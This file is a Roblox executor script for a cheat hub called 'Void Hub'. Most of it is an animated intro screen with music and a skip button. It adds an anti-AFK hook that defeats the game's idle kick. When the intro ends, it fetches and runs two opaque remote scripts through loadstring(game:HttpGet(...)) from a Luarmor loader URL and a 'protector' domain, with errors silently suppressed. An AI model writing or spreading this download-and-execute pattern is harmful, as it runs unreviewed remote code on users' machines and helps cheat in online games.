--============================================================
-- VOID HUB INTRO + ANTI KICK (ANTI-AFK)
-- RANDOM IMAGE + MUSIC + BEAT EFFECTS + SKIP
--============================================================

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")
local RunService = game:GetService("RunService")
local VirtualUser = game:GetService("VirtualUser")

local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

--============================================================
-- ANTI KICK / ANTI-AFK SYSTEM
--============================================================

player.Idled:Connect(function()
	VirtualUser:CaptureController()
	VirtualUser:ClickButton2(Vector2.new())
end)

--============================================================
-- SETTINGS
--============================================================

local MUSIC_URL =
	"https://files.catbox.moe/nynv9p.mp3"

local MUSIC_FILE =
	"VoidHub_Music_Longer.mp3"

local MUSIC_VOLUME =
	0.75

local BPM =
	100

local BEAT =
	60 / BPM

local IMAGES = {
	"rbxassetid://129700697019613",
	"rbxassetid://108697485255882",
	"rbxassetid://71211662493854",
	"rbxassetid://118953269416540"
}

--============================================================
-- CLEAN OLD
--============================================================

for _, name in ipairs({
	"VoidHubIntro", "ShadowVSIntro"
}) do
	local old = PlayerGui:FindFirstChild(name)
	if old then
		old:Destroy()
	end
end

--============================================================
-- IMAGE ORDER
--============================================================

local lastImage = shared.VoidHub_LastImage
local imageIndex

if not shared.VoidHub_Run then
	shared.VoidHub_Run = 1
	imageIndex = 2
elseif shared.VoidHub_Run == 1 then
	shared.VoidHub_Run = 2
	imageIndex = 1
else
	local choices = {}
	for i = 1, #IMAGES do
		if i ~= lastImage then
			table.insert(choices, i)
		end
	end
	imageIndex = choices[math.random(1, #choices)]
end

shared.VoidHub_LastImage = imageIndex
local IMAGE_ID = IMAGES[imageIndex]

--============================================================
-- INTRO STATE
--============================================================

local introActive = true
local introFinished = false
local introSound = nil

--============================================================
-- GUI
--============================================================

local gui = Instance.new("ScreenGui")
gui.Name = "VoidHubIntro"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 999999
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = PlayerGui

--============================================================
-- BACKGROUND & IMAGE
--============================================================

local background = Instance.new("Frame")
background.Size = UDim2.fromScale(1, 1)
background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
background.BorderSizePixel = 0
background.ClipsDescendants = true
background.Parent = gui

local image = Instance.new("ImageLabel")
image.AnchorPoint = Vector2.new(0.5, 0.5)
image.Position = UDim2.fromScale(0.5, 0.5)
image.Size = UDim2.fromScale(1.08, 1.08)
image.BackgroundTransparency = 1
image.Image = IMAGE_ID
image.ImageTransparency = 1
image.ScaleType = Enum.ScaleType.Crop
image.ZIndex = 1
image.Parent = background

local dark = Instance.new("Frame")
dark.Size = UDim2.fromScale(1, 1)
dark.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dark.BackgroundTransparency = 0.25
dark.BorderSizePixel = 0
dark.ZIndex = 2
dark.Parent = background

--============================================================
-- SKIP BUTTON
--============================================================

local skip = Instance.new("TextButton")
skip.AnchorPoint = Vector2.new(1, 0)
skip.Position = UDim2.new(1, -14, 0, 14)
skip.Size = UDim2.fromOffset(105, 36)
skip.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
skip.BackgroundTransparency = 0.15
skip.BorderSizePixel = 0
skip.Text = "SKIP INTRO"
skip.TextColor3 = Color3.fromRGB(255, 255, 255)
skip.TextSize = 12
skip.Font = Enum.Font.GothamBold
skip.AutoButtonColor = false
skip.ZIndex = 500
skip.Parent = gui

local skipCorner = Instance.new("UICorner")
skipCorner.CornerRadius = UDim.new(0, 7)
skipCorner.Parent = skip

local skipStroke = Instance.new("UIStroke")
skipStroke.Color = Color3.fromRGB(255, 255, 255)
skipStroke.Transparency = 0.75
skipStroke.Thickness = 1
skipStroke.Parent = skip

local flash = Instance.new("Frame")
flash.Size = UDim2.fromScale(1, 1)
flash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
flash.BackgroundTransparency = 1
flash.BorderSizePixel = 0
flash.ZIndex = 400
flash.Parent = gui

--============================================================
-- TITLE (VOID HUB)
--============================================================

local introTitle = Instance.new("TextLabel")
introTitle.AnchorPoint = Vector2.new(0.5, 0.5)
introTitle.Position = UDim2.fromScale(0.5, 0.5)
introTitle.Size = UDim2.fromScale(1.1, 0.22)
introTitle.BackgroundTransparency = 1
introTitle.Text = "VOID HUB"
introTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
introTitle.TextTransparency = 1
introTitle.TextScaled = true
introTitle.Font = Enum.Font.GothamBlack
introTitle.ZIndex = 20
introTitle.Parent = background

local titleStroke = Instance.new("UIStroke")
titleStroke.Color = Color3.fromRGB(0, 0, 0)
titleStroke.Thickness = 3
titleStroke.Transparency = 1
titleStroke.Parent = introTitle

local introSubtitle = Instance.new("TextLabel")
introSubtitle.AnchorPoint = Vector2.new(0.5, 0.5)
introSubtitle.Position = UDim2.fromScale(0.5, 0.59)
introSubtitle.Size = UDim2.fromScale(0.6, 0.05)
introSubtitle.BackgroundTransparency = 1
introSubtitle.Text = "OFFICIAL EDITION"
introSubtitle.TextColor3 = Color3.fromRGB(205, 205, 205)
introSubtitle.TextTransparency = 1
introSubtitle.TextScaled = true
introSubtitle.Font = Enum.Font.GothamBold
introSubtitle.ZIndex = 20
introSubtitle.Parent = background

--============================================================
-- MUSIC LOADER
--============================================================

local function loadMusic()
	local asset
	pcall(function()
		if isfile and isfile(MUSIC_FILE) then
			asset = getcustomasset(MUSIC_FILE)
		end
	end)
	if not asset then
		local success, data = pcall(function()
			return game:HttpGet(MUSIC_URL)
		end)
		if success and data and #data > 1000 then
			pcall(function() writefile(MUSIC_FILE, data) end)
			pcall(function() asset = getcustomasset(MUSIC_FILE) end)
		end
	end
	return asset
end

task.spawn(function()
	local asset = loadMusic()
	if not asset or not introActive then return end
	introSound = Instance.new("Sound")
	introSound.Name = "VoidHubIntroMusic"
	introSound.SoundId = asset
	introSound.Volume = MUSIC_VOLUME
	introSound.Looped = false
	introSound.Parent = SoundService
	pcall(function() introSound:Play() end)
end)

--============================================================
-- FINISH INTRO & RUN SCRIPTS
--============================================================

local function finishIntro()
	if introFinished then return end
	introFinished = true
	introActive = false

	if introSound then
		pcall(function()
			TweenService:Create(introSound, TweenInfo.new(0.35), {Volume = 0}):Play()
		end)
		task.delay(0.4, function()
			pcall(function()
				introSound:Stop()
				introSound:Destroy()
			end)
		end)
	end

	pcall(function() gui:Destroy() end)

	-- =========================================================
	-- السكريبتين بيشتغلوا هنا فور انتهاء الانترو أو تخطيه:
	-- =========================================================
	task.spawn(function()
		pcall(function()
			loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/28bc742e3a8f491e8155a5c4327fd4dd.lua"))()
		end)
	end)

	task.spawn(function()
		pcall(function()
			loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=dcon25o8"))()
		end)
	end)
end

--============================================================
-- EVENTS & ANIMATIONS
--============================================================

skip.MouseButton1Click:Connect(finishIntro)

skip.MouseEnter:Connect(function()
	TweenService:Create(skip, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(55, 55, 60)}):Play()
end)

skip.MouseLeave:Connect(function()
	TweenService:Create(skip, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(15, 15, 18)}):Play()
end)

TweenService:Create(image, TweenInfo.new(1.1, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {ImageTransparency = 0}):Play()
TweenService:Create(image, TweenInfo.new(30, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Size = UDim2.fromScale(1.22, 1.22)}):Play()

task.spawn(function()
	while introActive and gui.Parent do
		flash.BackgroundTransparency = 0.8
		TweenService:Create(flash, TweenInfo.new(0.12, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
		task.wait(BEAT)
	end
end)

task.wait(2.0)
if not introActive then return end

TweenService:Create(introTitle, TweenInfo.new(0.8, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.fromScale(0.9, 0.18), TextTransparency = 0}):Play()
TweenService:Create(titleStroke, TweenInfo.new(0.6), {Transparency = 0}):Play()

task.wait(1.5)
for i = 1, 30 do
	if not introActive then return end
	introTitle.Position = UDim2.fromScale(0.5 + math.random(-8, 8) / 1000, 0.5 + math.random(-8, 8) / 1000)
	task.wait(0.025)
end
introTitle.Position = UDim2.fromScale(0.5, 0.5)

TweenService:Create(introSubtitle, TweenInfo.new(0.8, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()

task.wait(15)
if not introActive then return end

for i = 1, 20 do
	if not introActive then return end
	flash.BackgroundTransparency = 0
	task.wait(0.025)
	flash.BackgroundTransparency = 1
	task.wait(0.065)
end

task.wait(3)
if not introActive then return end

TweenService:Create(introTitle, TweenInfo.new(1.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {TextTransparency = 1}):Play()
TweenService:Create(introSubtitle, TweenInfo.new(1.2, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {TextTransparency = 1}):Play()
TweenService:Create(titleStroke, TweenInfo.new(1.2), {Transparency = 1}):Play()
TweenService:Create(image, TweenInfo.new(2.0, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {ImageTransparency = 1}):Play()
TweenService:Create(dark, TweenInfo.new(2.0), {BackgroundTransparency = 1}):Play()

if introSound and introSound.Parent then
	TweenService:Create(introSound, TweenInfo.new(2.0, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {Volume = 0}):Play()
end

local finalFade = Instance.new("Frame")
finalFade.Size = UDim2.fromScale(1, 1)
finalFade.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
finalFade.BackgroundTransparency = 1
finalFade.BorderSizePixel = 0
finalFade.ZIndex = 1000
finalFade.Parent = gui

TweenService:Create(finalFade, TweenInfo.new(2.0, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {BackgroundTransparency = 0}):Play()

task.wait(2.1)
finishIntro()
